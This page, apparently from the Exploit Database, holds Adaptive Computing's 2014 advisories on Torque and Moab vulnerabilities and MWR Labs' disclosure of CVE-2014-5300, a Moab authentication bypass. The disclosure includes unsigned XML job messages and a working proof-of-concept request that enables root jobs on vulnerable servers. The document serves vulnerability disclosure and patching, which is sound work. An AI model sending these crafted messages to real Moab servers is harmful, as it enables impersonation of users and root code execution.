# Security Advisory

##### **Adaptive Computing Security Advisory**

Adaptive Computing Security Advisories are published for significant security issues that directly involve Adaptive Computing products and require an upgrade, fix, or other customer action. In all security advisories, Adaptive Computing discloses the minimum amount of information required for an end-user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Adaptive Computing does not provide vulnerability details that could enable someone to craft an exploit. All security advisories on support.adaptivecomputing.com/security-advisory are displayed in chronological order, with the most recently updated advisory appearing at the top of the page.

**November 12, 2014

Torque stack buffer overflow on disrsl\_**

TRQ-2971, CVE-2014-8729

*There is a potential for a buffer overflow attack in the disrl\_() and disrsl\_() functions.*

This has been fixed and is available in the 2.5-dev source code, 4.2.10, 4.5.2, and 5.0.2. Notes will be included in the respective release notes.

The two functions in question are used as part of the data in the string library, which reads and writes data across the network. With some care, a buffer overflow attack could be done for these functions, allowing malicious code to be potentially run as root.

**October 6, 2014****User impersonation**

MOAB-7478, MOAB-7526, [CVE-2014-5375](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5375)

*It is possible to submit jobs to Moab as arbitrary users due to insufficient authentication checks during the submission of a job to the Moab server.*

There are release notes for 7.2.9, 8.0.0 and on all subsequent releases. There was no code change for this.

Jobs submitted with invalid credentials are put in a held state, instead of rejected, until the administrator can respond. The checkjob command gives administrators further information regarding why the job is held. Blindly assuming that all held jobs should in fact be running is not only unsafe, but circumvents intentional Moab policies and workflow. An administrator should exercise care when resolving held jobs.

**October 6, 2014**

**Insecure message signing**

MOAB-7480, MOAB-7525, [CVE-2014-5376](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5376)

*Moab provides two methods to authenticate messages sent by users (e.g. job submissions). The default scheme which is widely used is insecure and can be circumvented in order to impersonate other users and perform operations on their behalf.*

There are release notes for 7.2.9, 8.0.0 and on all subsequent releases. There was no code change for this.

When installing or upgrading, it is strongly recommended that administrators configure Moab with Mauth Authentication with a complex key value.

**October 6, 2014****Authentication bypass**

MOAB-7479, MOAB-7524, MOAB-7100, [CVE-2014-5300](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5300)

*It is possible to bypass authentication within Moab in order to impersonate and run commands/operations as arbitrary users. The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8.*

There was a code change for this which exists in 8.0.0 released, 7.2.9 released, and on all subsequent releases. There was originally no release note. Adaptive Computing updated the 8.0.0 and 7.2.9 release notes today to include a release note. There will be a similar note in subsequent releases.

**October 2, 2014**

**Torque job can kill processes not owned by the job owner**

TRQ-2885, [CVE-2014-3684](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3684)

*After submitting a job, a non-root user can kill other processes – owned by any user – on any node running that job.*

This has been fixed on 4.2.10, 4.5.1 and 5.0.1 and has been noted in the respective release notes.

Within a TORQUE Resource Manager job, the tm\_adopt() TORQUE library call enables a user-built executable calling tm\_adopt() to adopt any session id (and its child processes) regardless of the session id owner on any node within a job. When a job that includes the executable calling tm\_adopt() exits, the adopted processes are killed along with the job processes during normal job cleanup. This can enable a non-root user to kill processes he/she doesn’t own including root-owned ones on any node in a job. The tm\_adopt() function is now limited to a session id that is owned by the calling user.

##[Moab Authentication Bypass : CVE-2014-5300]##

Software: Moab
Affected Versions: All versions prior to Moab 7.2.9 and Moab 8
CVE Reference: CVE-2014-5300
Author: John Fitzpatrick, MWR Labs (http://labs.mwrinfosecurity.com/)
Severity: High Risk
Vendor: Adaptive Computing
Vendor Response: Resolved in Moab 7.2.9 and Moab 8

##[Description]

It is possible to bypass authentication within Moab in order to impersonate and run commands/operations as arbitrary users. The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8.

##[Impact]

Successful exploitation could lead to remote code execution.

##[Cause]

The Moab server does not appropriately authenticate requests.

##[Solution]

Upgrade to Moab 7.2.9, Moab 8, or a later version of the software. Beta versions of Moab 8 are affected by this issue. This issue also affects versions of Moab which are using Munge for authentication.

This issue is believed to affect all instances of Moab prior to version 7.2.9 and 8. MWR are not aware of any alternate workaround for this issue.

##[Technical Details]

Moab is a workload manager used in High Performance Computing (HPC) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. This communication makes use of an XML based protocol, and example job submission is shown below:

<Envelope component="ClusterScheduler" count="1" name="moab" type="nonblocking" version="8.0.beta.2">
  <Signature>
    <DigestValue>7v49VzAlbyNQ4O3VChCus+v2LeE=</DigestValue>
    <SignatureValue>QG13cmxhYnMgRWFzdGVyIEVnZyE=</SignatureValue>
  </Signature>
  <Body actor="test" timestamp="1408488412">
    <Request action="submit" actor="test" cmdline="\STARTmsub">
      <Object>job</Object>
      <job>
        <Owner>test</Owner>
        <UserId>test</UserId>
        <GroupId>test</GroupId>
        <InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
        <UMask>2</UMask>
        <Executable>/usr/bin/id</Executable>
        <SubmitLanguage>PBS</SubmitLanguage>
        <SubmitString>\START/usr/bin/id\0a\0a</SubmitString>
      </job>
    </Request>
  </Body>
</Envelope>

Contained within this message is a <Signature> element, which contains both a <DigestValue> and <SignatureValue> elements. The <DigestValue> is simply a SHA1 sum of the <Body> element. The <SignatureValue>, however, is computed based upon a key (.moab.key) which is read by a setuid root binary (mauth) which performs some additional verification of the user before providing a signature for the message. This use of signatures is intended to prevent users from being able to craft arbitrary messages as the signature value is validated by the Moab server. Messages containing an incorrect signature for the message will be rejected.

However, whilst an incorrect SignatureValue results in a rejected message, it was found that if no signature is supplied then the signature checks are skipped and the remainder of the message processed. As a result it is possible to craft arbitrary messages and these messages will be accepted and honoured by the server as long as the message does not include a <Signature> element.

The following message contains no signature element and therefore will be accepted by the server:

<Envelope component="ClusterScheduler" count="1" name="moab" type="nonblocking" version="8.0.beta.2">
  <Body actor="test" timestamp="1408488412">
    <Request action="submit" actor="test" cmdline="\STARTmsub">
      <Object>job</Object>
      <job>
        <Owner>test</Owner>
        <UserId>test</UserId>
        <GroupId>test</GroupId>
        <InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
        <UMask>2</UMask>

        <Executable>/usr/bin/id</Executable>
        <SubmitLanguage>PBS</SubmitLanguage>
        <SubmitString>\START/usr/bin/id\0a\0a</SubmitString>
      </job>
    </Request>
  </Body>
</Envelope>

With no signing taking place an adversary can specify arbitrary users for these operations to be performed under, and thus impersonate other users including executing jobs as other users.

##[Proof of Concept]

In addition to job submission Moab also provides the ability to dynamically reconfigure the Moab server remotely. Whilst a default Moab installation will not permit the submission of root jobs it is possible to exploit this vulnerability in order to dynamically reconfigure Moab to allow root job submissions. The following request achieves this and due to its simple nature makes a useful proof of concept (the timestamp value may require altering):

00000238
<Envelope component="ClusterScheduler" count="1" name="moab" version="8.0.beta.2"><Body actor="root" timestamp="1404856164"><Request action="modify" actor="root" args="ALLOWROOTJOBS TRUE"><Object>sched</Object></Request></Body></Envelope>

Sending the entire message above (including the size value) will enable root jobs on a vulnerable server.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
